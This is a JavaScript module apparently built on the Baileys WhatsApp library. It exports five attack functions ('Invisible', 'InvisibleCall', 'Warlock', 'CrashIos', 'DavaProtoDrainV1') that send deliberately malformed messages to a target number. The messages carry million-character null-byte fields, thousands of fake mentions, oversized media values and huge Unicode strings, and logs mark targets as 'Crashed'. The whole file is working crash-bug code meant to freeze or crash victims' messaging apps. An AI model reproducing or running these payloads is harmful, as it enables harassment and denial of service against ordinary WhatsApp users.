const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const jimp = require("jimp")
const axios = require('axios')
const fsx = require('fs-extra')
const sharp = require('sharp')
const crypto = require('crypto')

async function Invisible(target, Candy = true) {
    for (let i = 0; i < 50; i++) {

        let Lolipop = generateWAMessageFromContent(
            target,
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            contextInfo: {
                                remoteJid: " Kkkk ",
                                mentionedJid: ["13135559098@s.whatsapp.net"]
                            },
                            body: {
                                text: "Lolipop3Xe",
                                format: "DEFAULT"
                            },
                            nativeFlowResponseMessage: {
                                name: "address_message",
                                paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                                version: 3
                            }
                        }
                    }
                }
            },
            {
                participant: { jid: target }
            }
        );

        await exxxa.relayMessage(
            target,
            {
                groupStatusMessageV2: {
                    message: Lolipop.message
                }
            },
            Candy
                ? { messageId: Lolipop.key.id, participant: { jid: target } }
                : { messageId: Lolipop.key.id }
        );
    }

    await new Promise(resolve => setTimeout(resolve, 5000));
}


async function InvisibleCall(target, Lolipop = false) {
    const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");

    try {
        const devices = (await exxxa.getUSyncDevices([target], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

        await exxxa.assertSessions(devices);

        const createMutex = () => {
            const locks = new Map();
            return {
                async mutex(key, fn) {
                    while (locks.has(key)) await locks.get(key);
                    const lock = Promise.resolve().then(() => fn());
                    locks.set(key, lock);
                    try { return await lock; }
                    finally { locks.delete(key); }
                }
            };
        };

        const mutexManager = createMutex();

        const appendBufferMarker = (buffer) => {
            const newBuffer = Buffer.alloc(buffer.length + 8);
            buffer.copy(newBuffer);
            newBuffer.fill(1, buffer.length);
            return newBuffer;
        };

        const originalCreateParticipantNodes = exxxa.createParticipantNodes?.bind(exxxa);
        const originalEncodeWAMessage = exxxa.encodeWAMessage?.bind(exxxa);

        exxxa.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
            if (!recipientJids.length) {
                return {
                    nodes: [],
                    shouldIncludeDeviceIdentity: false
                };
            }

            const processedMessage = await (exxxa.patchMessageBeforeSending?.(message, recipientJids) ?? message);

            const messagePairs = Array.isArray(processedMessage)
                ? processedMessage
                : recipientJids.map(jid => ({
                    recipientJid: jid,
                    message: processedMessage
                }));

            const { id: meId, lid: meLid } = exxxa.authState.creds.me;
            const localUser = meLid ? jidDecode(meLid)?.user : null;
            let includeDevID = false;

            const nodes = await Promise.all(
                messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
                    const { user: targetUser } = jidDecode(jid);
                    const { user: ownUser } = jidDecode(meId);
                    const isOwn = targetUser === ownUser || targetUser === localUser;
                    const isSelf = jid === meId || jid === meLid;

                    if (dsmMessage && isOwn && !isSelf) {
                        msg = dsmMessage;
                    }

                    const encodedBytes = appendBufferMarker(
                        originalEncodeWAMessage
                            ? originalEncodeWAMessage(msg)
                            : encodeWAMessage(msg)
                    );

                    return mutexManager.mutex(jid, async () => {
                        const { type, ciphertext } = await exxxa.signalRepository.encryptMessage({
                            jid,
                            data: encodedBytes
                        });

                        if (type === 'pkmsg') includeDevID = true;

                        return {
                            tag: 'to',
                            attrs: { jid },
                            content: [{
                                tag: 'enc',
                                attrs: { v: '2', type, ...extraAttrs },
                                content: ciphertext
                            }]
                        };
                    });
                })
            );

            return {
                nodes: nodes.filter(Boolean),
                shouldIncludeDeviceIdentity: includeDevID
            };
        };

        const callKey = crypto.randomBytes(32);
        const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
        const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

        const { nodes: destinations, shouldIncludeDeviceIdentity } = await exxxa.createParticipantNodes(devices, { conversation: "call-initiated" }, { count: '0' });

        const callStanza = {
            tag: "call",
            attrs: {
                to: target,
                id: exxxa.generateMessageTag(),
                from: exxxa.user.id
            },
            content: [{
                tag: "offer",
                attrs: { "call-id": callId, "call-creator": exxxa.user.id },
                content: [
                    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
                    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
                    ...(Lolipop ? [{
                        tag: "video",
                        attrs: {
                            enc: "vp8",
                            dec: "vp8",
                            orientation: "0",
                            screen_width: "1920",
                            screen_height: "1080",
                            device_orientation: "0"
                        }
                    }] : []),
                    { tag: "net", attrs: { medium: "3" }},
                    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1,5,247,9,228,250,1]) },
                    { tag: "encopt", attrs: { keygen: "2" }},
                    { tag: "destination", attrs: {}, content: destinations },
                    ...(shouldIncludeDeviceIdentity ? [{
                        tag: "device-identity",
                        attrs: {},
                        content: encodeSignedDeviceIdentity(exxxa.authState.creds.account, true)
                    }] : [])
                ].filter(Boolean)
            }]
        };

        await exxxa.sendNode(callStanza);

    } catch (error) {
        console.error('Sending Terhalang :', error);
        throw error;
    }
}

const mediaData = [
  {
    ID: "69680D38",
    uri: "t62.43144-24/10000000_790307790709311_669779370012050552_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa3QGnIg1qMpL5Isc7LmIdU1IpoFsCqXialsd2OW2w0QQyUw&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "7ovcifxdIivWXIJgLvrRtPfs+pPXen7hoXtnoFKdP4s=",
    mkey: "Wql96TBHCa44YVS6eAlHGI6aYIYg6yc0kuOr0Y9WvtI="
  },
  {
    ID: "69680D38",
    uri: "t62.43144-24/10000000_1534257120961824_1506742782412655205_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa3QEE7wUPnOULMZhlwnOw_bhHK6Gn7YI0hKpVm3yvw5dGMw&oe",
    sid: "5e03e0",
    SHA256: "I2ky6mhJmsFYmA+XRBoiaiTeYwnXGQAVXym+P/9YN6Y=",
    ENCSHA256: "HyfU2MhgxBQFFIohXT68RNZa0MAZRxDYB4X1c3I7JQY=",
    mkey: "Q5V7iUFs67ewh1qOOkqwQ9avc3u7qXAhyh2fIgVITCU="
  },
  {
    ID: "696C0CE0",
    uri: "t62.43144-24/10000000_1897784937438799_7647459696855315586_n.enc?ccb=11-4&oh",
    buffer: "01_Q5Aa3QGNjK1V4UGLF19HxU16vRNPFJQjy64pYSFbsuEm6bySdw&oe",
    sid: "5e03e0",
    SHA256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
    ENCSHA256: "RA4VN83TrKamnTjEolURSU7+2UUDY28EFBBQvFNh7e4=",
    mkey: "dTMN5/4/mFir4PcfgezcrIXqigJ8pl/COUQMxUsTaac="
  }
];

let sequentialIndex = 0;

async function Warlock(target) {
  var a = mediaData[sequentialIndex];
  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  var b = a.ID;
  const e = a.uri,
    f = a.buffer,
    g = a.sid,
    k = a.SHA256,
    l = a.ENCSHA256;

  a = a.mkey;

  let c;
  c = !1;

  b = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${e}=${f}=${b}&_nc_sid=${g}&mms3=true`,
          fileSha256: k,
          fileEncSha256: l,
          mediaKey: a,
          mimetype: "image/webp",
          directPath: `/v/${e}=${f}=${b}&_nc_sid=${g}`,
          fileLength: {
            low: Math.floor(1E3 * Math.random()),
            high: 0,
            unsigned: !0
          },
          mediaKeyTimestamp: {
            low: Math.floor(17E8 * Math.random()),
            high: 0,
            unsigned: !1
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: !0,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1E4 }, () =>
                "1" + Math.floor(5E6 * Math.random()) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: {
            low: Math.floor(-2E7 * Math.random()),
            high: 555,
            unsigned: c
          },
          isAvatar: c,
          isAiSticker: c,
          isLottie: c
        }
      }
    }
  };

  let stickerMsg = generateWAMessageFromContent(target, b, {});

  await exxxa.relayMessage("status@broadcast", stickerMsg.message, {
    messageId: stickerMsg.key.id,
    statusJidList: [target]
  });

  let CardsX = [];

  for (let r = 0; r < 1000; r++) {
    CardsX.push({
      body: { text: "" },
      header: {
        title: "",
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "UFo9Q2lDI3u2ttTEIZUgR21/cKk2g1MRkh4w5Ctks7U=",
          fileLength: "98",
          height: 4,
          width: 4,
          mediaKey: "UBWMsBkh2YZ4V1m+yFzsXcojeEt3xf26Ml5SBjwaJVY=",
          fileEncSha256: "9mEyFfxHmkZltimvnQqJK/62Jt3eTRAdY1GUPsvAnpE=",
          directPath: "/o1/v/t24/f2/m269/AQN5SPRzLJC6O-BbxyC5MdKx4_dnGVbIx1YkCz7vUM_I4lZaqXevb8TxmFJPT0mbUhEuVm8GQzv0i1e6Lw4kX8hG-x21PraPl0Xb6bAVhA?ccb=9-4&oh=01_Q5Aa1wH8yrMTOlemKf-tfJL-qKzHP83DzTL4M0oOd0OA3gwMlg&oe=68723029&_nc_sid=e6ed6c",
          mediaKeyTimestamp: "1749728782"
        },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [{ name: "voice_call", buttonParamsJson: {} }]
      }
    });
  }

  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "ZENIFER" },
            carouselMessage: { cards: CardsX }
          }
        }
      }
    },
    {}
  );

  await exxxa.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target]
  });

  const module = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 999999999999999999,
            seconds: 9999999999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "13300350@s.whatsapp.net",
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ]
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const Content = generateWAMessageFromContent(target, module.message, { userJid: target });

  await exxxa.relayMessage("status@broadcast", Content.message, {
    messageId: Content.key.id,
    statusJidList: [target]
  });

  const viewOnceMsg = generateWAMessageFromContent(
    "status@broadcast",
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "$", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3
            }
          }
        }
      }
    },
    {}
  );

  await exxxa.relayMessage("status@broadcast", viewOnceMsg.message, {
    messageId: viewOnceMsg.key.id,
    statusJidList: [target]
  });

  console.log(chalk.red(`Sending Travas ${target}`));
}

async function CrashIos(target) {
  try {
    let msg = {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: -9.09999262999,
            degreesLongitude: 199.9996311899,
            name: "Zenifer$" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
            address: "Zenifer$" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
            url: `https://wa.me/meta.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            jpegThumbnail: Buffer.from([0x00]),
          },
        },
      },
    };
    
    for (let i = 0; i < 1; i++) {
      await exxxa.relayMessage(target, msg, { participant: { jid: target }, messageId: exxxa.generateMessageTag() });
      await new Promise((r) => setTimeout(r, 1500));
    }
  } catch (err) {
    console.err(`Tejadi Kesalahan ${target}`, err);
    throw err;
  }
}

async function DavaProtoDrainV1(target) {
    const msg = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    messageSecret: crypto.randomBytes(32),
                    supportPayload: JSON.stringify({
                        version: 2,
                        is_ai_message: true,
                        should_show_system_message: true,
                        ticket_id: crypto.randomBytes(16)
                    }),
                    badgeChat: {
                        unreadCount: 9999
                    }
                },
                documentMessage: {
                    url: `https://dl${200}.server.com/file.bin`,
                    mimetype: 'application/octet-stream',
                    title: `Data_${200}.bin`,
                    fileSha256: Buffer.alloc(32).fill(200),
                    fileLength: 100 * 1024 * 1024,
                    pageCount: 1,
                    mediaKey: Buffer.alloc(32).fill(200 + 200),
                    fileName: `file_${200}.bin`,
                    fileEncSha256: Buffer.alloc(32).fill(200 + 300),
                    directPath: `/files/file_${200}.bin`,
                    mediaKeyTimestamp: Date.now(),
                    jpegThumbnail: Buffer.alloc(5000).fill(255),
                    contextInfo: {
                      mentionedJid: Array.from({ length: 1901 }, () => `1${Math.floor(Math.random() * 9000000000000)}@s.whatsapp.net`),
                      groupMentions: [],
                      entryPointConversionSource: "non_contact",
                      entryPointConversionApp: "whatsapp",
                      entryPointConversionDelaySeconds: 467593,
                      stanzaId: "666-666666-Dava" + "-Id" + Math.floor(Math.random() * 99999),
                    }
                }
            }
        }
    };

    await exxxa.relayMessage("status@broadcast", msg, {
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
            }]
        }]
    });

    if (target) {
        await exxxa.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "Crashed" },
                content: undefined
            }]
        });
    }
}


module.exports = {
  Invisible,
  InvisibleCall,
  Warlock,
  CrashIos,
  DavaProtoDrainV1
};